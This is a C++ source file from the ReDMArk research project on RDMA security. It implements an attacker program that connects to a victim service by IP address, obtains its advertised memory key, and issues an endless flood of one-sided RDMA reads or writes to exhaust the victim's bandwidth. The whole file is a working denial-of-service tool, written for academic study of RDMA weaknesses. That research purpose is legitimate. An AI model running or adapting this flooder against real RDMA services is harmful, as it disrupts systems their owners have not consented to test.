/**                                                                                                      
 * ReDMArk: Bypassing RDMA Security Mechanisms
 * 
 * Launch an attacker that issues flood of one-sided traffic to a victim service.
 *
 * Copyright (c) 2020-2021 ETH-Zurich. All rights reserved.
 * 
 * Author(s): Konstantin Taranov <konstantin.taranov@inf.ethz.ch>
 * 
 */
#include "verbsEP.hpp"
#include "connectRDMA.hpp"
#include <chrono>
#include "cxxopts.hpp"


uint32_t totalsize = 8*1024*1024;

VerbsEP *ep; 

uint64_t remote_addr;
uint32_t rkey; 

uint64_t local_addr;
uint32_t lkey; 

uint32_t outstand;
 
struct ibv_pd* pd = NULL;
char* buf = NULL;
struct ibv_mr* mr = NULL;
 
cxxopts::ParseResult
parse(int argc, char* argv[])
{
    cxxopts::Options options(argv[0], "Server for the microbenchmark");
    options
      .positional_help("[optional args]")
      .show_positional_help();
 
  try
  {
 
    options.add_options()
      ("address", "IP address of the victim", cxxopts::value<std::string>(), "IP")
      ("size", "message size", cxxopts::value<uint32_t>()->default_value(std::to_string(16)), "BYTES")
      ("outstand", "outstanding ops", cxxopts::value<uint32_t>()->default_value(std::to_string(64)), "N")
      ("write", "use writes instead of reads. Default: use reads")
      ("help", "Print help")
     ;
 
    auto result = options.parse(argc, argv);

    if (result.count("help"))
    {
      std::cout << options.help({""}) << std::endl;
      exit(0);
    }

    if (result.count("address") == 0)
    {
      std::cout << options.help({""}) << std::endl;
      exit(0);
    }

    return result;

  } catch (const cxxopts::OptionException& e)
  {
    std::cout << "error parsing options: " << e.what() << std::endl;
    std::cout << options.help({""}) << std::endl;
    exit(1);
  }
}

void bw_write_unlim(uint32_t size){

 
  struct ibv_wc wc[8];
    
  uint32_t cur_outstand = 0; 

  while(true){

    if(cur_outstand < outstand){
      ep->write_signaled(0, local_addr, lkey, remote_addr, rkey, size);
      cur_outstand++;
    }
 
    int ret = ep->poll_send_completion(wc,8); 
    if(ret){
      cur_outstand-=ret; 
    } 
  }
}
 


void bw_read_unlim(uint32_t size){

 
  struct ibv_wc wc[8];
    
  uint32_t cur_outstand = 0; 

  while(true){

    if(cur_outstand < outstand){
      ep->read_signaled(0, local_addr, lkey, remote_addr, rkey, size);
      cur_outstand++;
    }
 
    int ret = ep->poll_send_completion(wc,8); 
    if(ret){
      cur_outstand-=ret; 
    } 
  }
}
 

void connect(const std::string& ip, uint32_t outstand, bool write){
      int port = 9999;
      ClientRDMA * client = new ClientRDMA(const_cast<char*>(ip.c_str()),port);
      struct ibv_qp_init_attr attr;
      struct rdma_conn_param conn_param;
     
      memset(&attr, 0, sizeof(attr));
      attr.cap.max_send_wr = outstand+2;
      attr.cap.max_recv_wr = 1;
      attr.cap.max_send_sge = 1;
      attr.cap.max_recv_sge = 1;
      attr.cap.max_inline_data = 0;
      attr.qp_type = IBV_QPT_RC;

      memset(&conn_param, 0 , sizeof(conn_param));
      conn_param.responder_resources = 0;
      conn_param.initiator_depth = write ? 0 : 16;
      conn_param.retry_count = 3; 
      conn_param.rnr_retry_count = 3;  

      ep = client->connectEP(&attr,&conn_param,pd);
      
      buf = (char*)aligned_alloc(4096, totalsize); 
      mr =  ep->reg_mem(buf,totalsize);
      local_addr = (uint64_t)buf;
      lkey = mr->lkey;
   
      ep->post_recv(0,mr);
 
      struct ibv_wc wc;
      while(ep->poll_recv_completion(&wc)==0){

      }
      struct ibv_sge sge = *(struct ibv_sge*)buf;
       
      remote_addr = sge.addr;
      rkey = sge.lkey;

      pd = ep->pd;
 
      printf("Connection is established\n");
}

int main(int argc, char* argv[]){
 
  auto allparams = parse(argc,argv);

  std::string ip = allparams["address"].as<std::string>();
  totalsize = allparams["size"].as<uint32_t>();
  outstand = allparams["outstand"].as<uint32_t>();
 
  connect(ip, outstand,allparams.count("write"));
  if(allparams.count("write")){
      bw_write_unlim(totalsize);
  } else {
      bw_read_unlim(totalsize);
  }

 
  return 0;
}

